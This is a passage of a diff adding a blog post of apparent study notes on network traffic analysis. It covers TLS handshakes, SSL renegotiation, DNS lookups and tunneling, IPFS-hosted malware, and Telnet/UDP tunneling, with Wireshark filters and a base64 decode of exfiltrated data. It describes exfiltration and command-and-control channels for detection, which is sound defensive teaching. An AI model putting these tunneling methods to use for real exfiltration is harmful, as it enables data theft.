+  </thead>
+  <tbody>
+      <tr>
+          <td><code>Client Hello</code></td>
+          <td><code>ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }</code></td>
+      </tr>
+      <tr>
+          <td><code>Server Hello</code></td>
+          <td><code>ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod</code> }</td>
+      </tr>
+      <tr>
+          <td><code>Certificate Exchange</code></td>
+          <td><code>ServerCertificate = { ServerPublicCertificate }</code></td>
+      </tr>
+      <tr>
+          <td><code>Key Exchange</code></td>
+          <td>- <code>ClientDHPrivateKey</code><!-- raw HTML omitted -->- <code>ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)</code><!-- raw HTML omitted -->- <code>ClientKeyExchange = { ClientDHPublicKey }</code><!-- raw HTML omitted -->- <code>ServerDHPrivateKey</code><!-- raw HTML omitted -->- <code>ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)</code><!-- raw HTML omitted -->- <code>ServerKeyExchange = { ServerDHPublicKey }</code></td>
+      </tr>
+      <tr>
+          <td><code>Premaster Secret</code></td>
+          <td>- <code>PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)</code><!-- raw HTML omitted -->- <code>PremasterSecret = DH_KeyAgreement(ClientDHPublicKey, ServerDHPrivateKey)</code></td>
+      </tr>
+      <tr>
+          <td><code>Session Key Derivation</code></td>
+          <td><code>MasterSecret = PRF(PremasterSecret, &quot;master secret&quot;, ClientNonce + ServerNonce</code>)</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td><code>KeyBlock = PRF(MasterSecret, &quot;key expansion&quot;, ServerNonce + ClientNonce)</code></td>
+      </tr>
+      <tr>
+          <td><code>Extraction of Session Keys</code></td>
+          <td>- <code>ClientWriteMACKey = First N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteMACKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ClientWriteKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteKey = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ClientWriteIV = Next N bytes of KeyBlock</code><!-- raw HTML omitted -->- <code>ServerWriteIV = Next N bytes of KeyBlock</code></td>
+      </tr>
+      <tr>
+          <td><code>Finished Messages</code></td>
+          <td><code>FinishedMessage = PRF(MasterSecret, &quot;finished&quot;, Hash(ClientHello + ServerHello))</code></td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="diving-into-ssl-renegotiation-attacks">Diving into SSL Renegotiation Attacks</h2>
+<ul>
+<li>
+<p>In order to find irregularities in handshakes, we can utilize TCP dump and Wireshark as we have done before.</p>
+</li>
+<li>
+<p>In order to filter to only handshake messages we can use this filter in Wireshark.</p>
+</li>
+<li>
+<p><code>ssl.record.content_type == 22</code></p>
+</li>
+<li>
+<p>The content type 22 specifies handshake messages only.</p>
+</li>
+<li>
+<p>Specifying this filter we should get a view like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-HTTPs.png" alt="1-HTTPs"></p>
+</li>
+</ul>
+<p>When we are looking for SSL renegotiation attacks, we can look for the following.</p>
+<ol>
+<li><code>Multiple Client Hellos</code>—Multiple client hellos from a single client within a short period indicate a potential SSL renegotiation attack, where the attacker repeatedly triggers renegotiation to downgrade the cipher suite.</li>
+<li><code>Out of Order Handshake Messages</code>—Out-of-order traffic can occur due to packet loss, but in SSL renegotiation, a server receiving a client hello after handshake completion is a key indicator.</li>
+</ol>
+<ul>
+<li>An attacker might conduct this attack against us for the following reasons</li>
+</ul>
+<ol>
+<li><code>Denial of Service</code>—SSL renegotiation attacks consume a ton of resources on the server side, and as such it might overwhelm the server and cause it to be unresponsive.</li>
+<li><code>SSL/TLS Weakness Exploitation</code>—The attacker might attempt renegotiation to potentially exploit vulnerabilities with our current implementation of cipher suites.</li>
+<li><code>Cryptanalysis</code>—The attacker might use renegotiation as a part of an overall strategy to analyze our SSL/TLS patterns for other systems.</li>
+</ol>
+<hr>
+<h1 id="peculiar-dns-traffic">Peculiar DNS Traffic</h1>
+<ul>
+<li>
+<p>Peculiar == غَيْرُ مَأْلُوف.</p>
+</li>
+<li>
+<p>DNS Traffic can be cumbersome (مرهق) to inspect, as many times our clients will generate a ton of it, and abnormalities can sometimes get buried in the mass volume of it.</p>
+</li>
+<li>
+<p>However, understanding DNS and some direct signs of malicious actions is important in our traffic analysis efforts.</p>
+</li>
+</ul>
+<h2 id="dns-queries">DNS Queries</h2>
+<ul>
+<li>
+<p>DNS queries are used when a client wants to resolve a domain name with an IP address, or the other way around.</p>
+</li>
+<li>
+<p>First, we can explore the most common type of query, which is forward lookups.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/DNS_forward_queries.jpg" alt="DNS_forward_queries"></p>
+</li>
+<li>
+<p>Generally speaking, when a client initiates a DNS forward lookup query, it does the following steps.</p>
+</li>
+<li>
+<p>Request:</p>
+<ul>
+<li><code>Where is academy.hackthebox.com?</code></li>
+</ul>
+</li>
+<li>
+<p>Response:</p>
+<ul>
+<li><code>Well its at 192.168.10.6</code></li>
+</ul>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Step</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>1. Query Initiation</code></td>
+          <td>When the user wants to visit something like <code>academy.hackthebox.com</code> it initiates a DNS forward query.</td>
+      </tr>
+      <tr>
+          <td><code>2. Local Cache Check</code></td>
+          <td>The client then checks its local DNS cache to see if it has already resolved the domain name to an IP address. If not it continues with the following.</td>
+      </tr>
+      <tr>
+          <td><code>3. Recursive Query</code></td>
+          <td>The client then sends its recursive query to its configured DNS server (local or remote).</td>
+      </tr>
+      <tr>
+          <td><code>4. Root Servers</code></td>
+          <td>The DNS resolver, if necessary, starts by querying the root name servers to find the authoritative name servers for the top-level domain (TLD). There are 13 root servers distributed worldwide.</td>
+      </tr>
+      <tr>
+          <td><code>5. TLD Servers</code></td>
+          <td>The root server then responds with the authoritative name servers for the TLD (aka <code>.com</code> or <code>.org</code>)</td>
+      </tr>
+      <tr>
+          <td><code>6. Authoritative Servers</code></td>
+          <td>The DNS resolver then queries the TLD&rsquo;s authoritative name servers for the second-level domain (aka <code>hackthebox.com</code>).</td>
+      </tr>
+      <tr>
+          <td><code>7. Domain Name's Authoritative Servers</code></td>
+          <td>Finally, the DNS resolver queries the domains authoritative name servers to obtain the IP address associated with the requested domain name (aka <code>academy.hackthebox.com</code>).</td>
+      </tr>
+      <tr>
+          <td><code>8. Response</code></td>
+          <td>The DNS resolver then receives the IP address (A or AAAA record) and sends it back to the client that initiated the query.</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="dns-reverse-lookupsqueries">DNS Reverse Lookups/Queries</h4>
+<ul>
+<li>
+<p>On the opposite side, we have Reverse Lookups.</p>
+</li>
+<li>
+<p>These occur when a client already knows the IP address and wants to find the corresponding FQDN (Fully Qualified Domain Name).</p>
+</li>
+<li>
+<p>Request:</p>
+<ul>
+<li><code>What is your name 192.168.10.6?</code></li>
+</ul>
+</li>
+<li>
+<p>Response:</p>
+<ul>
+<li><code>Well its academy.hackthebox.com :)</code></li>
+</ul>
+</li>
+<li>
+<p>In this case the steps are a bit less complicated.</p>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Step</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>1. Query Initiation</code></td>
+          <td>The client sends a DNS reverse query to its configured DNS resolver (server) with the IP address it wants to find the domain name.</td>
+      </tr>
+      <tr>
+          <td><code>2. Reverse Lookup Zones</code></td>
+          <td>The DNS resolver checks if it is authoritative for the reverse lookup zone that corresponds to the IP range as determined by the received IP address. Aka <code>192.0.2.1</code>, the reverse zone would be <code>1.2.0.192.in-addr.arpa</code></td>
+      </tr>
+      <tr>
+          <td><code>3. PTR Record Query</code></td>
+          <td>The DNS resolver then looks for a PTR record on the reverse lookup zone that corresponds to the provided IP address.</td>
+      </tr>
+      <tr>
+          <td><code>4. Response</code></td>
+          <td>If a matching PTR is found, the DNS server (resolver) then returns the FQDN of the IP for the client.</td>
+      </tr>
+  </tbody>
+</table>
+<p><img src="http://localhost:1313/Network%20Traffic%20Analysis/reverse-dns-lookup-diagram.webp" alt="reverse-dns-lookup-diagram"></p>
+<h2 id="dns-record-types">DNS Record Types</h2>
+<ul>
+<li>DNS has many different record types responsible for holding different information.</li>
+<li>We should be familiar with these, especially when monitoring DNS traffic.</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Record Type</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>A</code> (Address)</td>
+          <td>This record maps a domain name to an IPv4 address</td>
+      </tr>
+      <tr>
+          <td><code>AAAA</code> (Ipv6 Address)</td>
+          <td>This record maps a domain name to an IPv6 address</td>
+      </tr>
+      <tr>
+          <td><code>CNAME</code> (Canonical Name)</td>
+          <td>This record creates an alias for the domain name. Aka hello.com = world.com</td>
+      </tr>
+      <tr>
+          <td><code>MX</code> (Mail Exchange)</td>
+          <td>This record specifies the mail server responsible for receiving email messages on behalf of the domain.</td>
+      </tr>
+      <tr>
+          <td><code>NS</code> (Name Server)</td>
+          <td>This specifies an authoritative name servers for a domain.</td>
+      </tr>
+      <tr>
+          <td><code>PTR</code> (Pointer)</td>
+          <td>This is used in reverse queries to map an IP to a domain name</td>
+      </tr>
+      <tr>
+          <td><code>TXT</code> (Text)</td>
+          <td>This is used to specify text associated with the domain</td>
+      </tr>
+      <tr>
+          <td><code>SOA</code> (Start of Authority)</td>
+          <td>This contains administrative information about the zone</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="finding-dns-enumeration-attempts">Finding DNS Enumeration Attempts</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>dns_enum_detection.pcapng</code>.</p>
+</li>
+<li>
+<p>We might notice a significant amount of DNS traffic from one host when we start to look at our raw output in Wireshark.</p>
+</li>
+<li>
+<p><code>dns</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-DNSTraffic.png" alt="1-DNSTraffic"></p>
+</li>
+<li>
+<p>We might even notice this traffic concluded/ended with something like <code>ANY</code>:
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-DNSTraffic.png" alt="2-DNSTraffic"></p>
+</li>
+<li>
+<p>This would be:</p>
+<ul>
+<li>A clear indication of DNS enumeration.</li>
+<li>And possibly even subdomain enumeration from an attacker.</li>
+</ul>
+</li>
+</ul>
+<h2 id="finding-dns-tunneling">Finding DNS Tunneling</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>dns_tunneling.pcapng</code>.</p>
+</li>
+<li>
+<p>On the other hand, we might notice a good amount of text records from one host.</p>
+</li>
+<li>
+<p>This could indicate DNS tunneling.</p>
+</li>
+<li>
+<p>Like ICMP tunneling, attackers can and have utilized DNS forward and reverse lookup queries to perform data exfiltration.</p>
+</li>
+<li>
+<p>They do so by appending the data they would like to exfiltrate as a part of the TXT field.</p>
+</li>
+<li>
+<p>If this was happening it might look like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-DNSTraffic.png" alt="3-DNSTraffic"></p>
+</li>
+<li>
+<p>Upon closer inspection, anomalous text may be visible in the lower right-hand corner of the screen.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-DNSTraffic.png" alt="4-DNSTraffic"></p>
+</li>
+<li>
+<p>However, in many cases, this data might be encoded or encrypted, and we might notice the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/5-DNSTraffic.png" alt="5-DNSTraffic"></p>
+</li>
+<li>
+<p>We can retrieve this value from Wireshark by locating it like the following and right-clicking the value to specify to copy it.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/6-DNSTraffic.png" alt="6-DNSTraffic"></p>
+</li>
+<li>
+<p>Then if we were to go into our Linux machine, in this case we could utilize something like <code>base64 -d</code> to retrieve the true value.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=&#39;</span> | base64 -d
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>U0ZSQ2UxZHZkV3hrWDNsdmRWOW1iM0ozWVhKa1gyMWxYM1JvYVhOZmNISmxkSFI1WDNCc1pXRnpaWDBLCg==
+</span></span></code></pre></div><ul>
+<li>However, in some cases attackers will double if not triple encode the value they are attempting to exfiltrate through DNS tunneling, so we might need to do the following.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VTBaU1EyVXhaSFprVjNocldETnNkbVJXT1cxaU0wb3pXVmhLYTFneU1XeFlNMUp2WVZoT1ptTklTbXhrU0ZJMVdETkNjMXBYUm5wYQpXREJMQ2c9PQo=&#39;</span> | base64 -d | base64 -d | base64 -d
+</span></span></code></pre></div><ul>
+<li>
+<p>However, we might need to do more than just base64 decode these values, as in many cases as mentioned these values might be encrypted.</p>
+</li>
+<li>
+<p>Attackers might conduct DNS tunneling for the following reasons:</p>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Step</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>1. Data Exfiltration</code></td>
+          <td>As shown above DNS tunneling can be helpful for attackers trying to get data out of our network without getting caught.</td>
+      </tr>
+      <tr>
+          <td><code>2. Command and Control</code></td>
+          <td>Some malware and malicious agents will utilize DNS tunneling on compromised systems in order to communicate back to their command and control servers. Notably, we might see this method of usage in botnets.</td>
+      </tr>
+      <tr>
+          <td><code>3. Bypassing Firewalls and Proxies</code></td>
+          <td>DNS tunneling allows attackers to bypass firewalls and web proxies that only monitor HTTP/HTTPs traffic. DNS traffic is traditionally allowed to pass through network boundaries. As such, it is important that we monitor and control this traffic.</td>
+      </tr>
+      <tr>
+          <td><code>4. Domain Generation Algorithms (DGAs)</code></td>
+          <td>Some more advanced malware will utilize DNS tunnels to communicate back to their command and control servers that use dynamically generated domain names through DGAs. This makes it much more difficult for us to detect and block these domain names.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="the-interplanetary-file-system-and-dns-tunneling">The Interplanetary File System and DNS Tunneling</h2>
+<ul>
+<li>It has been observed in recent years that advanced threat actors will utilize the Interplanetary file System to store and pull malicious files.</li>
+<li>As such we should always watch out for DNS and HTTP/HTTPs traffic to URIs like the following:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
+</span></span></code></pre></div><ul>
+<li>These forms of attacks can be exceptionally difficult to detect as IPFS innately operates on a peer to peer basis.</li>
+<li>To learn more, we can research into IPFS.</li>
+</ul>
+<p><a href="https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/">Interplanetary File System</a>.</p>
+<hr>
+<h1 id="strange-telnet--udp-connections">Strange Telnet &amp; UDP Connections</h1>
+<ul>
+<li>When analyzing network traffic for unusual activity, pay close attention to Telnet and UDP protocols.</li>
+<li>These protocols are sometimes missed but can provide valuable insights.</li>
+</ul>
+<p><img src="http://localhost:1313/Network%20Traffic%20Analysis/Internet.png" alt="Internet"></p>
+<ul>
+<li>
+<p>Telnet:</p>
+<ul>
+<li>Is a bidirectional network protocol.</li>
+<li>Defined in RFC 854.</li>
+<li>Enabling interactive communication between devices.</li>
+</ul>
+</li>
+<li>
+<p>Developed in the 1970s, its use has declined significantly in favor of SSH.</p>
+</li>
+<li>
+<p>Legacy systems may still use Telnet for remote command and control of Microsoft terminal services.</p>
+</li>
+<li>
+<p>However, monitor Telnet communications for suspicious activity, as attackers can exploit it for data exfiltration and tunneling.</p>
+</li>
+</ul>
+<h2 id="finding-traditional-telnet-traffic-port-23">Finding Traditional Telnet Traffic Port 23</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>telnet_tunneling_23.pcapng</code>.</p>
+</li>
+<li>
+<p>Suppose we were to open Wireshark, we might notice some telnet communications originating from Port 23.</p>
+</li>
+<li>
+<p>In this case, we can always inspect this traffic further.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-telnet.png" alt="1-telnet"></p>
+</li>
+<li>
+<p>Telnet traffic is usually unencrypted/decrypted and easy to inspect.</p>
+</li>
+<li>
+<p>However, like ICMP, DNS, and other tunneling methods, attackers can encrypt, encode, or obfuscate this text.</p>
+</li>
+<li>
+<p>Therefore, we should always be cautious.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-telnet.png" alt="2-telnet"></p>
+</li>
+</ul>
+<h2 id="unrecognized-tcp-telnet-in-wireshark">Unrecognized TCP Telnet in Wireshark</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>telnet_tunneling_9999.pcapng</code>.</p>
+</li>
+<li>
+<p>Telnet is just a communication protocol, and as such can be easily redirected to different ports by attackers.</p>
+</li>
+<li>
+<p>Monitoring unusual port activity can help detect potentially malicious actions.</p>
+</li>
+<li>
+<p>For example:
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-telnet.png" alt="3-telnet"></p>
+</li>
+<li>
+<p>We may observe frequent communication from a single client on port 9999, which warrants further investigation into the communication&rsquo;s content.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-telnet.png" alt="4-telnet"></p>
+</li>
+<li>
+<p>If we noticed something like above, we would want to follow this TCP stream.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/5-telnet.png" alt="5-telnet"></p>
+</li>
+<li>
+<p>Doing so can allow us to inspect potentially malicious actions.</p>
+</li>
+</ul>
+<h2 id="telnet-protocol-through-ipv6">Telnet Protocol through IPv6</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>telnet_tunneling_ipv6.pcapng</code>.</p>
+</li>
+<li>
+<p>Observing IPv6 traffic in a network not configured for IPv6 can indicate malicious activity.</p>
+</li>
+<li>
+<p>For example, IPv6 addresses used for telnet connections would be suspicious.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/6-telnet.png" alt="6-telnet"></p>
+</li>
+<li>
+<p>We can narrow down our filter in Wireshark to only show telnet traffic from these addresses with the following filter.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
+</span></span></code></pre></div><p><img src="http://localhost:1313/Network%20Traffic%20Analysis/7-telnet.png" alt="7-telnet"></p>
+<ul>
+<li>Likewise, we can inspect the contents of these packets through their data field, or by following the TCP stream.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/8-telnet.png" alt="8-telnet"></li>
+</ul>
+<h2 id="watching-udp-communications">Watching UDP Communications</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>udp_tunneling.pcapng</code>.</p>
+</li>
+<li>
+<p>Attackers may choose to use UDP connections instead of TCP when exfiltrating data.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/udp-tcp.jpg" alt="udp-tcp"></p>
+</li>
+<li>
+<p>One of the biggest distinguishing aspects between TCP and UDP is that UDP is connectionless and provides fast transmission.</p>
+</li>
+<li>
+<p>Let&rsquo;s take the following traffic for instance.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-udp.png" alt="1-udp"></p>
+</li>
+<li>
+<p>We will notice that instead of a SYN, SYN/ACK, ACK sequence, the communications are immediately sent over to the recipient.</p>
+</li>
+<li>
+<p>Like TCP, we can follow UDP traffic in Wireshark, and inspect its contents.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-udp.png" alt="2-udp"></p>
+</li>
+</ul>
+<h2 id="common-uses-of-udp">Common Uses of UDP</h2>
+<ul>
+<li>UDP although less reliable than TCP provides quicker connections through its connectionless state.</li>
+<li>As such, we might find legitimate traffic that uses UDP like the following:</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Step</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>1. Real-time Applications</code></td>
+          <td>Applications like streaming media, online gaming, real-time voice and video communications</td>
+      </tr>
+      <tr>
+          <td><code>2. DNS (Domain Name System)</code></td>
+          <td>DNS queries and responses use UDP</td>
+      </tr>
+      <tr>
+          <td><code>3. DHCP (Dynamic Host Configuration Protocol)</code></td>
+          <td>DHCP uses UDP to assign IP addresses and configuration information to network devices.</td>
+      </tr>
+      <tr>
+          <td><code>4. SNMP (Simple Network Management Protocol)</code></td>
+          <td>SNMP uses UDP for network monitoring and management</td>
+      </tr>
+      <tr>
+          <td><code>5. TFTP (Trivial File Transfer Protocol)</code></td>
+          <td>TFTP uses UDP for simple file transfers, commonly used by older Windows systems and others.</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+
+        </div>
+      </article>
+
+      <hr />
+
+      <div class="post-info">
+        
+        
+
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+            <polyline points="14 2 14 8 20 8"></polyline>
+            <line x1="16" y1="13" x2="8" y2="13"></line>
+            <line x1="16" y1="17" x2="8" y2="17"></line>
+            <polyline points="10 9 9 9 8 9"></polyline>
+          </svg>
+          7749 Words
+        </p>
+
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+            <line x1="16" y1="2" x2="16" y2="6"></line>
+            <line x1="8" y1="2" x2="8" y2="6"></line>
+            <line x1="3" y1="10" x2="21" y2="10"></line>
+          </svg>
+          
+            2026-04-24 01:51
+          
+
+           
+            
+          
+        </p>
+      </div>
+        <hr />
+        <div class="sharing-buttons">
+          
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Detecting%20Network%20Abnormalities&amp;caption=Detecting%20Network%20Abnormalities&amp;canonicalUrl=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Detecting%20Network%20Abnormalities&amp;body=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f&amp;media=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f;description=Detecting%20Network%20Abnormalities" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f&amp;title=Detecting%20Network%20Abnormalities&amp;summary=Detecting%20Network%20Abnormalities&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2f2026%2f04%2fdetecting-network-abnormalities%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
